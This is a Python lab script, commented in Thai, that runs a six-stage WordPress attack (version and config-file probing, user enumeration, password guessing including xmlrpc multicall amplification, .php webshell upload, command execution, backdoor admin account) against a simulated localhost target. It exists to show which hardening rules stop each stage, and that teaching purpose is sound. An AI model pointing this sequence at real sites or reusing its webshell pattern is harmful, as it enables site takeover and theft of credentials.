#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""attacker.py — เดินลำดับการเจาะเว็บ WordPress จริง ยิงใส่เป้าจำลองบน localhost

    python attacker.py                       # ยิงเป้าที่ localhost:8099
    python attacker.py --port 8099

ทำงานเป็น 6 ขั้น เรียงตามที่บอทจริงเดิน:
    1. ลาดตระเวน   - เว็บนี้คือ WordPress เวอร์ชันอะไร
    2. หาชื่อผู้ใช้ - ได้ชื่อมาครึ่งหนึ่งของรหัสผ่านฟรี
    3. เดารหัสผ่าน  - ทั้งทาง wp-login และ xmlrpc (ขยายกำลัง)
    4. วางเว็บเชลล์ - อัปไฟล์ .php ผ่านช่องโหว่ปลั๊กอิน
    5. รันคำสั่ง    - พิสูจน์ว่าคุมเครื่องได้
    6. ฝังตัว       - สร้างผู้ใช้ admin สำรองไว้กลับเข้ามาทีหลัง

รันเป้า 2 โหมดเทียบกัน จะเห็นว่ากฎ hardening ตัดขั้นไหนทิ้ง:
    หน้าต่าง 1:  python target.py                 แล้ว  python attacker.py
    หน้าต่าง 2:  python target.py --hardened       แล้ว  python attacker.py

⚠️ ยิงได้แค่ 127.0.0.1 เท่านั้น (โค้ดปฏิเสธเป้าอื่น) เป็นเครื่องมือฝึก ไม่ใช่อาวุธ
"""
import argparse
import sys
import time
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:%d"
GREEN, RED, DIM, YEL, BOLD, N = (
    "\033[92m", "\033[91m", "\033[90m", "\033[93m", "\033[1m", "\033[0m")


def req(method, path, data=None, port=8099):
    url = BASE % port + path
    body = data.encode() if isinstance(data, str) else data
    r = urllib.request.Request(url, data=body, method=method)
    r.add_header("User-Agent", "Mozilla/5.0 (compatible; attack-lab-sim)")
    try:
        resp = urllib.request.urlopen(r, timeout=5)
        return resp.status, resp.read().decode("utf-8", "ignore"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore"), dict(e.headers)
    except Exception as e:
        return 0, str(e), {}


def show(step, title):
    print("\n%s%s ขั้น %d: %s %s" % (BOLD, "━" * 3, step, title, N))


def line(cmd, code, note, ok):
    tag = "%sโดนบล็อก%s" % (RED, N) if not ok else "%sผ่าน%s" % (GREEN, N)
    hdr = ""
    if isinstance(note, dict):
        hdr = note.get("X-Blocked-By", "")
        note = hdr or ""
    print("  %s%-46s%s [%s] %s" % (DIM, cmd, N, tag, note))


def blocked(headers, code):
    return code in (401, 403, 404, 429) or "X-Blocked-By" in headers


def run(port):
    print("%sเป้าหมาย: %s%s" % (BOLD, BASE % port, N))
    owned = True         # ยึดเว็บได้ไหมเมื่อจบ

    # ---- 1. ลาดตระเวน ----
    show(1, "ลาดตระเวน — เว็บนี้คืออะไร เวอร์ชันไหน")
    code, html, h = req("GET", "/", port=port)
    import re
    m = re.search(r'generator" content="WordPress ([\d.]+)', html)
    if m:
        print("  %sพบ:%s WordPress %s (จาก meta generator ที่หน้าแรก)"
              % (YEL, N, m.group(1)))
        print("  %s-> รู้เวอร์ชันแล้ว เปิดตารางช่องโหว่ของเวอร์ชันนี้ได้ทันที%s" % (DIM, N))
    else:
        print("  %sไม่พบเวอร์ชันจากหน้าแรก%s (meta generator ถูกซ่อน)" % (GREEN, N))
    for probe in ("/readme.html", "/wp-config.php.bak", "/.env", "/wp-config.php"):
        c, _, hh = req("GET", probe, port=port)
        line("GET %s" % probe, c, hh, not blocked(hh, c))

    # ---- 2. หาชื่อผู้ใช้ ----
    show(2, "หาชื่อผู้ใช้ — ได้มาครึ่งหนึ่งของรหัสฟรี")
    users = []
    c, body, h = req("GET", "/wp-json/wp/v2/users", port=port)
    if not blocked(h, c) and body.startswith("["):
        users = re.findall(r'"slug":"([^"]+)"', body)
        print("  %sREST API แจกชื่อ:%s %s" % (RED, N, ", ".join(users) or "-"))
    else:
        line("GET /wp-json/wp/v2/users", c, h, False)
    c, body, h = req("GET", "/?author=1", port=port)
    if c in (301, 302) and "Location" in h:
        who = h["Location"].strip("/").split("/")[-1]
        print("  %s?author=1 พาไป:%s /author/%s/ -> ชื่อผู้ใช้คือ '%s'"
              % (RED, N, who, who))
        if who not in users:
            users.append(who)
    else:
        line("GET /?author=1", c, h, False)
    if not users:
        print("  %sไม่ได้ชื่อผู้ใช้เลย — การเดารหัสต้องเดาทั้งชื่อและรหัส งานหนักขึ้นเท่าตัว%s"
              % (GREEN, N))
        users = ["admin"]       # บอทเดาต่อด้วยชื่อยอดนิยม

    # ---- 3. เดารหัสผ่าน ----
    show(3, "เดารหัสผ่าน — ทั้ง wp-login และ xmlrpc")
    target_user = users[0]
    common = ["123456", "password", "admin123", "P@ssw0rd123", "letmein"]
    cracked = None
    hit_limit = False
    for pw in common:
        data = "log=%s&pwd=%s" % (urllib.parse.quote(target_user), urllib.parse.quote(pw))
        c, body, h = req("POST", "/wp-login.php", data, port=port)
        if c == 429 or "X-Blocked-By" in h:
            hit_limit = True
            line("POST /wp-login.php (%s)" % pw, c, h, False)
            break
        if c == 302 and "wp-admin" in h.get("Location", ""):
            cracked = pw
            print("  %s%sเดารหัสถูก:%s %s / %s" % (BOLD, RED, N, target_user, pw))
            break
        line("POST /wp-login.php (ลอง %s)" % pw, c, "รหัสผิด", True)
    if hit_limit:
        print("  %s-> โดน rate limit หลัง 5 ครั้ง บรูตต่อไม่ได้%s" % (GREEN, N))
    # xmlrpc amplification
    multicall = ("<methodCall><methodName>system.multicall</methodName>"
                 "<params><value>" + "<value>เดา</value>" * 500 +
                 "</value></params></methodCall>")
    c, body, h = req("POST", "/xmlrpc.php", multicall, port=port)
    if blocked(h, c):
        line("POST /xmlrpc.php (ลอง 500 รหัส/ครั้ง)", c, h, False)
        print("  %s-> xmlrpc ปิด บรูตแบบขยายกำลังทำไม่ได้ CPU ไม่ถูกเผา%s" % (GREEN, N))
    else:
        print("  %sxmlrpc รับ 500 การเดาใน request เดียว%s — ยิงหมื่นรหัส/นาทีได้สบาย"
              % (RED, N))
        print("  %s   นี่คือตัวที่ทำ CPU 92%% บน bbc29pro.com%s" % (DIM, N))

    # ---- 4. วางเว็บเชลล์ ----
    show(4, "วางเว็บเชลล์ — อัปไฟล์ .php ผ่านช่องโหว่ปลั๊กอิน")
    shell_name = "wp-cache-x.php"
    # เนื้อไฟล์เป็นแค่ marker ไม่ใช่เว็บเชลล์จริง (ของจริงคือ system($_GET['cmd']))
    payload = ('------b\r\nContent-Disposition: form-data; name="file"; '
               'filename="%s"\r\n\r\n<?php /* SIM: เว็บเชลล์จำลอง ไม่มีโค้ดรัน */\r\n------b--'
               % shell_name)
    c, body, h = req("POST", "/wp-admin/admin-ajax.php?action=upload", payload, port=port)
    shell_path = None
    if not blocked(h, c) and '"url"' in body:
        shell_path = re.search(r'"url":"([^"]+)"', body).group(1)
        print("  %sอัปโหลดผ่าน:%s %s" % (RED, N, shell_path))
        # ลองเรียกเว็บเชลล์
        c2, b2, h2 = req("GET", shell_path + "?cmd=id", port=port)
        if blocked(h2, c2):
            line("GET %s?cmd=id" % shell_path, c2, h2, False)
            print("  %s-> อัปได้แต่ 'รันไม่ได้' — กฎห้ามรัน PHP ใน uploads ตัดจบตรงนี้%s"
                  % (GREEN, N))
            shell_path = None
        else:
            print("  %sเว็บเชลล์ตอบกลับ:%s %s" % (RED, N, b2.strip()))
    else:
        line("POST upload .php", c, h, False)
    # ลองวางในที่ที่ผู้บุกรุกจริงชอบซ่อน
    for hidden in ("/wp-includes/x9d5285/shell.php",
                   "/wp-content/uploads/.well-known/.a1/system.php"):
        c, _, h = req("GET", hidden, port=port)
        line("GET %s" % hidden, c, h, not blocked(h, c))

    # ---- 5. รันคำสั่ง ----
    show(5, "รันคำสั่ง — พิสูจน์ว่าคุมเครื่องได้")
    if shell_path:
        for cmd in ("whoami", "id"):
            c, body, h = req("GET", shell_path + "?cmd=" + cmd, port=port)
            print("  $ %s%-8s%s -> %s" % (YEL, cmd, N, body.strip()))
    else:
        print("  %sไม่มีเว็บเชลล์ที่รันได้ — ขั้นนี้ไปต่อไม่ได้%s" % (GREEN, N))
        owned = False

    # ---- 6. ฝังตัว ----
    show(6, "ฝังตัว — สร้าง admin สำรองไว้กลับเข้ามา")
    if shell_path:
        c, body, h = req("POST", shell_path, "action=create_admin", port=port)
        print("  %s%s%s" % (RED, body.strip(), N))
        print("  %s-> ต่อให้เปลี่ยนรหัส admin เดิม เขาก็ยังมีบัญชี hacker_bkp กลับเข้ามาได้%s"
              % (DIM, N))
    else:
        print("  %sเข้าไม่ถึงระบบ — ฝังตัวไม่ได้%s" % (GREEN, N))

    # ---- สรุป ----
    print("\n%s%s สรุป %s" % (BOLD, "━" * 3, N))
    if owned:
        print("  %s%sยึดเว็บสำเร็จ%s — บอทเดินครบทั้ง 6 ขั้น เว็บกลายเป็นฐานยิงต่อ"
              % (BOLD, RED, N))
        print("  ลองรันใหม่กับ  %spython target.py --hardened%s  แล้วดูว่าตัดขั้นไหนทิ้ง" % (YEL, N))
    else:
        print("  %s%sกันไว้ได้%s — บอทตกขบวนกลางทาง เข้าไม่ถึงการรันโค้ด"
              % (BOLD, GREEN, N))
        print("  แต่ละขั้นที่ 'โดนบล็อก' คือกฎหนึ่งข้อใน configs/wp-hardening.conf")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8099)
    a = ap.parse_args()
    print("%s%s" % (BOLD, "แล็บซ้อมเจาะ WordPress — ยิงเป้าจำลองบน localhost เท่านั้น" + N))
    try:
        run(a.port)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
